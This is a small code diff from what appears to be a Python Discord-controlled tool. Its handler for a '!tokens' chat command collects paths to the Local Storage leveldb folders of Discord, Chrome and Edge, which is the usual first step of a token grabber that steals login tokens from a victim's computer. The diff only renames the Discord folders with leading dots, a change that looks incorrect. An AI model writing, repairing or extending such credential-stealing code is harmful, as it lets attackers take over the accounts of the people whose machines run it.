@@ -115,9 +115,9 @@ async def on_message(message):
 
     if message.content == "!tokens":
         paths = [
-            os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
-            os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
-            os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("APPDATA"), ".discord", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("APPDATA"), ".discordcanary", "Local Storage", "leveldb"),
+            os.path.join(os.getenv("APPDATA"), ".discordptb", "Local Storage", "leveldb"),
             os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
             os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),
             os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
